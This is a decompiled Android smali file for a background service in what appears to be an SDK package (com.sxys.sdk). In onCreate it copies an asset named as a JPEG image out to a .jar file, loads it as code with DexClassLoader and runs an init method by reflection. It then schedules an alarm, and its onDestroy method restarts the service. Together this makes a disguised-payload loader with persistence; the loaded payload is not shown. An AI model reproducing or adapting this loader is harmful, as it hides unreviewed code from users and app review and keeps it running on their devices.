.class public Lcom/sxys/sdk/svcs;
.super Landroid/app/Service;
.source "svcs.java"


# static fields
.field public static final SERVICE_STR:Ljava/lang/String; = "com.sxys.sdk.svcs"

.field public static _Apk_Handler:Landroid/os/Handler;

.field public static cClass:Ljava/lang/Class;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/lang/Class",
            "<*>;"
        }
    .end annotation
.end field

.field public static coreAPP:Ljava/lang/Object;

.field public static core_filename:Ljava/lang/String;

.field public static dex_filename:Ljava/lang/String;

.field public static isStart:Ljava/lang/Boolean;

.field public static setp_sec:J

.field public static zip_filename:Ljava/lang/String;


# instance fields
.field _mContext:Landroid/content/Context;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .prologue
    const/4 v0, 0x0

    .line 36
    sput-object v0, Lcom/sxys/sdk/svcs;->coreAPP:Ljava/lang/Object;

    .line 37
    sput-object v0, Lcom/sxys/sdk/svcs;->cClass:Ljava/lang/Class;

    .line 39
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/sxys/sdk/svcs;->isStart:Ljava/lang/Boolean;

    .line 41
    const-wide/32 v0, 0x1b7740

    sput-wide v0, Lcom/sxys/sdk/svcs;->setp_sec:J

    .line 43
    const-string v0, "scccxs.jar"

    sput-object v0, Lcom/sxys/sdk/svcs;->core_filename:Ljava/lang/String;

    .line 44
    const-string v0, "scccxs.dex"

    sput-object v0, Lcom/sxys/sdk/svcs;->dex_filename:Ljava/lang/String;

    .line 45
    const-string v0, "scccxs.jpg"

    sput-object v0, Lcom/sxys/sdk/svcs;->zip_filename:Ljava/lang/String;

    .line 126
    new-instance v0, Lcom/sxys/sdk/svcs$1;

    invoke-direct {v0}, Lcom/sxys/sdk/svcs$1;-><init>()V

    sput-object v0, Lcom/sxys/sdk/svcs;->_Apk_Handler:Landroid/os/Handler;

    .line 149
    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .prologue
    .line 31
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 47
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/sxys/sdk/svcs;->_mContext:Landroid/content/Context;

    .line 31
    return-void
.end method

.method public static isServiceRunning(Ljava/lang/String;Landroid/content/Context;)Z
    .locals 6
    .param p0, "servicename"    # Ljava/lang/String;
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 113
    const-string v3, "activity"

    invoke-virtual {p1, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    .line 114
    .local v0, "am":Landroid/app/ActivityManager;
    const/16 v3, 0x64

    invoke-virtual {v0, v3}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;

    move-result-object v2

    .line 115
    .local v2, "infos":Ljava/util/List;, "Ljava/util/List<Landroid/app/ActivityManager$RunningServiceInfo;>;"
    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_0
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-nez v4, :cond_1

    .line 121
    const/4 v2, 0x0

    .line 122
    const/4 v3, 0x0

    :goto_0
    return v3

    .line 115
    :cond_1
    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager$RunningServiceInfo;

    .line 116
    .local v1, "info":Landroid/app/ActivityManager$RunningServiceInfo;
    iget-object v4, v1, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    invoke-virtual {v4}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v4

    iget-object v5, v1, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    invoke-virtual {v5}, Landroid/content/ComponentName;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    .line 117
    const/4 v2, 0x0

    .line 118
    const/4 v3, 0x1

    goto :goto_0
.end method

.method public static start(Landroid/content/Context;)Ljava/lang/Boolean;
    .locals 2
    .param p0, "m_context"    # Landroid/content/Context;

    .prologue
    .line 64
    const-string v0, "com.sxys.sdk.svcs"

    invoke-static {v0, p0}, Lcom/sxys/sdk/svcs;->isServiceRunning(Ljava/lang/String;Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 65
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/sxys/sdk/svcs;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 66
    const-string v0, "Print"

    const-string v1, "no run service! start service..."

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 67
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    .line 72
    :goto_0
    return-object v0

    .line 70
    :cond_0
    const-string v0, "Print"

    const-string v1, "start service..."

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 72
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    goto :goto_0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 58
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 20

    .prologue
    .line 155
    invoke-super/range {p0 .. p0}, Landroid/app/Service;->onCreate()V

    .line 156
    const-string v15, "Print"

    const-string v16, "onCreate"

    invoke-static/range {v15 .. v16}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 157
    invoke-virtual/range {p0 .. p0}, Lcom/sxys/sdk/svcs;->getApplicationContext()Landroid/content/Context;

    move-result-object v15

    move-object/from16 v0, p0

    iput-object v15, v0, Lcom/sxys/sdk/svcs;->_mContext:Landroid/content/Context;

    .line 159
    invoke-virtual/range {p0 .. p0}, Lcom/sxys/sdk/svcs;->getApplicationContext()Landroid/content/Context;

    move-result-object v15

    invoke-virtual {v15}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v15

    invoke-virtual {v15}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v13

    .line 160
    .local v13, "path":Ljava/lang/String;
    new-instance v9, Ljava/io/File;

    sget-object v15, Lcom/sxys/sdk/svcs;->core_filename:Ljava/lang/String;

    invoke-direct {v9, v13, v15}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 161
    .local v9, "file":Ljava/io/File;
    invoke-virtual {v9}, Ljava/io/File;->isFile()Z

    move-result v15

    if-nez v15, :cond_0

    .line 165
    :try_start_0
    new-instance v12, Ljava/io/FileOutputStream;

    invoke-direct {v12, v9}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 166
    .local v12, "oStream":Ljava/io/OutputStream;
    invoke-virtual/range {p0 .. p0}, Lcom/sxys/sdk/svcs;->getResources()Landroid/content/res/Resources;

    move-result-object v15

    invoke-virtual {v15}, Landroid/content/res/Resources;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v15

    sget-object v16, Lcom/sxys/sdk/svcs;->zip_filename:Ljava/lang/String;

    invoke-virtual/range {v15 .. v16}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v10

    .line 167
    .local v10, "iStream":Ljava/io/InputStream;
    const/4 v6, -0x1

    .line 168
    .local v6, "ch":I
    const/16 v15, 0x400

    new-array v5, v15, [B

    .line 169
    .local v5, "buffer":[B
    :goto_0
    invoke-virtual {v10, v5}, Ljava/io/InputStream;->read([B)I

    move-result v6

    const/4 v15, -0x1

    if-ne v6, v15, :cond_3

    .line 172
    invoke-virtual {v12}, Ljava/io/OutputStream;->flush()V

    .line 173
    invoke-virtual {v12}, Ljava/io/OutputStream;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 184
    .end local v5    # "buffer":[B
    .end local v6    # "ch":I
    .end local v10    # "iStream":Ljava/io/InputStream;
    .end local v12    # "oStream":Ljava/io/OutputStream;
    :cond_0
    :goto_1
    :try_start_1
    sget-object v15, Lcom/sxys/sdk/svcs;->coreAPP:Ljava/lang/Object;

    if-nez v15, :cond_1

    sget-object v15, Lcom/sxys/sdk/svcs;->cClass:Ljava/lang/Class;

    if-eqz v15, :cond_2

    .line 185
    :cond_1
    const/4 v15, 0x0

    sput-object v15, Lcom/sxys/sdk/svcs;->coreAPP:Ljava/lang/Object;

    .line 186
    const/4 v15, 0x0

    sput-object v15, Lcom/sxys/sdk/svcs;->cClass:Ljava/lang/Class;

    .line 190
    :cond_2
    const-string v15, "Print"

    const-string v16, "coreAPP and cClass Instance.........."

    invoke-static/range {v15 .. v16}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 192
    new-instance v7, Ldalvik/system/DexClassLoader;

    new-instance v15, Ljava/lang/StringBuilder;

    invoke-static {v13}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v16

    invoke-direct/range {v15 .. v16}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v16, "/"

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    sget-object v16, Lcom/sxys/sdk/svcs;->core_filename:Ljava/lang/String;

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v15

    const/16 v16, 0x0

    invoke-virtual/range {p0 .. p0}, Lcom/sxys/sdk/svcs;->getApplicationContext()Landroid/content/Context;

    move-result-object v17

    invoke-virtual/range {v17 .. v17}, Landroid/content/Context;->getClassLoader()Ljava/lang/ClassLoader;

    move-result-object v17

    move-object/from16 v0, v16

    move-object/from16 v1, v17

    invoke-direct {v7, v15, v13, v0, v1}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    .line 193
    .local v7, "cl":Ldalvik/system/DexClassLoader;
    const-string v15, "com.sxys.core.scors"

    invoke-virtual {v7, v15}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v15

    sput-object v15, Lcom/sxys/sdk/svcs;->cClass:Ljava/lang/Class;

    .line 194
    sget-object v15, Lcom/sxys/sdk/svcs;->cClass:Ljava/lang/Class;

    invoke-virtual {v15}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v15

    sput-object v15, Lcom/sxys/sdk/svcs;->coreAPP:Ljava/lang/Object;

    .line 196
    sget-object v15, Lcom/sxys/sdk/svcs;->cClass:Ljava/lang/Class;

    const-string v16, "init"

    const/16 v17, 0x1

    move/from16 v0, v17

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v17, v0

    const/16 v18, 0x0

    const-class v19, Landroid/content/Context;

    aput-object v19, v17, v18

    invoke-virtual/range {v15 .. v17}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v11

    .line 197
    .local v11, "method":Ljava/lang/reflect/Method;
    sget-object v15, Lcom/sxys/sdk/svcs;->coreAPP:Ljava/lang/Object;

    const/16 v16, 0x1

    move/from16 v0, v16

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v16, v0

    const/16 v17, 0x0

    invoke-virtual/range {p0 .. p0}, Lcom/sxys/sdk/svcs;->getApplicationContext()Landroid/content/Context;

    move-result-object v18

    aput-object v18, v16, v17

    move-object/from16 v0, v16

    invoke-virtual {v11, v15, v0}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 209
    new-instance v3, Landroid/content/Intent;

    const-class v15, Lcom/sxys/sdk/sclock;

    move-object/from16 v0, p0

    invoke-direct {v3, v0, v15}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 210
    .local v3, "alarIntent":Landroid/content/Intent;
    const/4 v15, 0x0

    const/high16 v16, 0x8000000

    move-object/from16 v0, p0

    move/from16 v1, v16

    invoke-static {v0, v15, v3, v1}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v14

    .line 211
    .local v14, "pintent":Landroid/app/PendingIntent;
    const-string v15, "alarm"

    move-object/from16 v0, p0

    invoke-virtual {v0, v15}, Lcom/sxys/sdk/svcs;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/app/AlarmManager;

    .line 212
    .local v4, "am":Landroid/app/AlarmManager;
    sget v15, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v16, 0x13

    move/from16 v0, v16

    if-ge v15, v0, :cond_5

    .line 213
    const-string v15, "Print"

    const-string v16, "SDK_INT < 19"

    invoke-static/range {v15 .. v16}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 214
    const/4 v15, 0x0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v16

    sget-wide v18, Lcom/sxys/sdk/svcs;->setp_sec:J

    add-long v16, v16, v18

    move-wide/from16 v0, v16

    invoke-virtual {v4, v15, v0, v1, v14}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 220
    .end local v3    # "alarIntent":Landroid/content/Intent;
    .end local v4    # "am":Landroid/app/AlarmManager;
    .end local v7    # "cl":Ldalvik/system/DexClassLoader;
    .end local v11    # "method":Ljava/lang/reflect/Method;
    .end local v14    # "pintent":Landroid/app/PendingIntent;
    :goto_2
    return-void

    .line 170
    .restart local v5    # "buffer":[B
    .restart local v6    # "ch":I
    .restart local v10    # "iStream":Ljava/io/InputStream;
    .restart local v12    # "oStream":Ljava/io/OutputStream;
    :cond_3
    const/4 v15, 0x0

    :try_start_2
    invoke-virtual {v12, v5, v15, v6}, Ljava/io/OutputStream;->write([BII)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto/16 :goto_0

    .line 175
    .end local v5    # "buffer":[B
    .end local v6    # "ch":I
    .end local v10    # "iStream":Ljava/io/InputStream;
    .end local v12    # "oStream":Ljava/io/OutputStream;
    :catch_0
    move-exception v2

    .line 176
    .local v2, "EE":Ljava/lang/Exception;
    invoke-virtual {v9}, Ljava/io/File;->delete()Z

    .line 178
    invoke-virtual/range {p0 .. p0}, Lcom/sxys/sdk/svcs;->stopSelf()V

    goto/16 :goto_1

    .line 199
    .end local v2    # "EE":Ljava/lang/Exception;
    :catch_1
    move-exception v8

    .line 200
    .local v8, "ee":Ljava/lang/Exception;
    const-string v15, "PError"

    new-instance v16, Ljava/lang/StringBuilder;

    const-string v17, "----Error:"

    invoke-direct/range {v16 .. v17}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v17

    invoke-virtual/range {v16 .. v17}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    invoke-virtual/range {v16 .. v16}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v16

    invoke-static/range {v15 .. v16}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 201
    invoke-virtual {v9}, Ljava/io/File;->isFile()Z

    move-result v15

    if-eqz v15, :cond_4

    .line 202
    invoke-virtual {v9}, Ljava/io/File;->delete()Z

    .line 205
    :cond_4
    invoke-virtual/range {p0 .. p0}, Lcom/sxys/sdk/svcs;->stopSelf()V

    goto :goto_2

    .line 217
    .end local v8    # "ee":Ljava/lang/Exception;
    .restart local v3    # "alarIntent":Landroid/content/Intent;
    .restart local v4    # "am":Landroid/app/AlarmManager;
    .restart local v7    # "cl":Ldalvik/system/DexClassLoader;
    .restart local v11    # "method":Ljava/lang/reflect/Method;
    .restart local v14    # "pintent":Landroid/app/PendingIntent;
    :cond_5
    const-string v15, "Print"

    const-string v16, "SDK_INT >=19"

    invoke-static/range {v15 .. v16}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 218
    const/4 v15, 0x0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v16

    sget-wide v18, Lcom/sxys/sdk/svcs;->setp_sec:J

    add-long v16, v16, v18

    move-wide/from16 v0, v16

    invoke-virtual {v4, v15, v0, v1, v14}, Landroid/app/AlarmManager;->setExact(IJLandroid/app/PendingIntent;)V

    goto :goto_2
.end method

.method public onDestroy()V
    .locals 6

    .prologue
    const/4 v5, 0x0

    .line 87
    const-string v2, "Print"

    const-string v3, "onDestroy"

    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 90
    :try_start_0
    sget-object v2, Lcom/sxys/sdk/svcs;->coreAPP:Ljava/lang/Object;

    if-eqz v2, :cond_0

    sget-object v2, Lcom/sxys/sdk/svcs;->cClass:Ljava/lang/Class;

    if-eqz v2, :cond_0

    .line 91
    sget-object v2, Lcom/sxys/sdk/svcs;->cClass:Ljava/lang/Class;

    const-string v3, "destroy"

    const/4 v4, 0x0

    new-array v4, v4, [Ljava/lang/Class;

    invoke-virtual {v2, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    .line 92
    .local v1, "method":Ljava/lang/reflect/Method;
    sget-object v2, Lcom/sxys/sdk/svcs;->coreAPP:Ljava/lang/Object;

    const/4 v3, 0x0

    new-array v3, v3, [Ljava/lang/Object;

    invoke-virtual {v1, v2, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 99
    .end local v1    # "method":Ljava/lang/reflect/Method;
    :cond_0
    :goto_0
    sget-object v2, Lcom/sxys/sdk/svcs;->coreAPP:Ljava/lang/Object;

    if-eqz v2, :cond_1

    .line 100
    sput-object v5, Lcom/sxys/sdk/svcs;->coreAPP:Ljava/lang/Object;

    .line 102
    :cond_1
    sget-object v2, Lcom/sxys/sdk/svcs;->cClass:Ljava/lang/Class;

    if-eqz v2, :cond_2

    .line 103
    sput-object v5, Lcom/sxys/sdk/svcs;->cClass:Ljava/lang/Class;

    .line 106
    :cond_2
    invoke-static {p0}, Lcom/sxys/sdk/svcs;->start(Landroid/content/Context;)Ljava/lang/Boolean;

    .line 107
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 108
    return-void

    .line 95
    :catch_0
    move-exception v0

    .line 96
    .local v0, "ee":Ljava/lang/Exception;
    const-string v2, "Print"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "----sbcast Error:"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 2
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "startId"    # I

    .prologue
    .line 53
    const-string v0, "Print"

    const-string v1, "start.........."

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 54
    return-void
.end method
